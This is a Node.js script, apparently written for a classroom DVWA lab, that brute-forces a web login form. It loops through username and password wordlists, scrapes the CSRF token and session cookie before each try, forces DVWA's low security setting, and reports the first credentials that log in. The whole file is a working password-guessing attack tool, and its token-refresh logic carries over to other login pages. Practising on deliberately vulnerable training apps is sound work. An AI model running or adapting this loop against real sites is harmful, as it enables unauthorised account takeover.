const fs = require("fs/promises");
const path = require("path");

const LOGIN_URL = "http://10.115.3.64:4280/login.php";
const BASE_URL = new URL(LOGIN_URL).origin;
const DELAY_MS = 200; // small delay to keep classroom target stable

function parseToken(html) {
  const match = html.match(/name=['"]user_token['"]\s+value=['"]([^'"]+)['"]/i);
  return match ? match[1] : "";
}

function splitSetCookieHeader(value) {
  if (!value) return [];
  return value.split(/,(?=\s*[A-Za-z0-9_\-]+=)/g).map((v) => v.trim());
}

function buildCookieHeader(existingCookieHeader, response) {
  const cookieMap = new Map();

  if (existingCookieHeader) {
    for (const pair of existingCookieHeader.split(";")) {
      const [k, ...rest] = pair.trim().split("=");
      if (k && rest.length) cookieMap.set(k, rest.join("="));
    }
  }

  let setCookies = [];
  if (typeof response.headers.getSetCookie === "function") {
    setCookies = response.headers.getSetCookie();
  } else {
    const raw = response.headers.get("set-cookie");
    setCookies = splitSetCookieHeader(raw);
  }

  for (const entry of setCookies) {
    const first = entry.split(";")[0];
    const [name, ...rest] = first.split("=");
    if (name && rest.length) cookieMap.set(name.trim(), rest.join("=").trim());
  }

  return Array.from(cookieMap.entries())
    .map(([k, v]) => `${k}=${v}`)
    .join("; ");
}

function ensureDvwaSecurityCookie(cookieHeader) {
  // DVWA often expects this cookie; keep it if already set.
  if (!cookieHeader) return "security=low";
  if (/\bsecurity=/.test(cookieHeader)) return cookieHeader;
  return `${cookieHeader}; security=low`;
}

async function readWordlist(fileName) {
  const filePath = path.join(__dirname, fileName);
  const content = await fs.readFile(filePath, "utf8");
  return content
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter(Boolean);
}

async function fetchLoginPage() {
  const response = await fetch(LOGIN_URL, { method: "GET", redirect: "follow" });
  const html = await response.text();
  const cookieHeader = buildCookieHeader("", response);
  const userToken = parseToken(html);

  if (!userToken) {
    throw new Error("Kein user_token gefunden. Prüfe DVWA Security Level/Captcha.");
  }

  return { cookieHeader, userToken };
}

function isSuccessfulLogin(response, responseBody) {
  const location = response.headers.get("location") || "";

  // Typical DVWA success: POST /login.php -> 302 redirect to index.php
  if (response.status >= 300 && response.status < 400 && !location.includes("login.php")) {
    return true;
  }

  // Fallback check if a redirect was followed by fetch (or custom DVWA page text)
  if (!response.url.includes("login.php")) return true;
  if (responseBody.includes("Login failed")) return false;
  return responseBody.includes("Welcome to Damn Vulnerable Web Application");
}

async function tryCredentials(username, password) {
  const { cookieHeader, userToken } = await fetchLoginPage();
  const requestCookies = ensureDvwaSecurityCookie(cookieHeader);

  const formData = new URLSearchParams({
    username,
    password,
    Login: "Login",
    user_token: userToken,
  });

  const response = await fetch(LOGIN_URL, {
    method: "POST",
    redirect: "manual",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
      Cookie: requestCookies,
      Referer: `${BASE_URL}/login.php`,
    },
    body: formData.toString(),
  });

  const body = await response.text();
  return isSuccessfulLogin(response, body);
}

async function main() {
  const usernames = await readWordlist("usernames.txt");
  const passwords = await readWordlist("passwords.txt");

  console.log(`Starte Test mit ${usernames.length * passwords.length} Kombinationen...`);

  for (const username of usernames) {
    for (const password of passwords) {
      process.stdout.write(`Teste ${username}:${password} ... `);
      try {
        const ok = await tryCredentials(username, password);
        if (ok) {
          console.log("SUCCESS");
          console.log(`Gefunden: username='${username}', password='${password}'`);
          return;
        }
        console.log("fail");
      } catch (err) {
        console.log(`error (${err.message})`);
      }

      await new Promise((resolve) => setTimeout(resolve, DELAY_MS));
    }
  }

  console.log("Kein Treffer in den gegebenen Listen.");
}

main().catch((err) => {
  console.error("Unerwarteter Fehler:", err.message);
  process.exit(1);
});
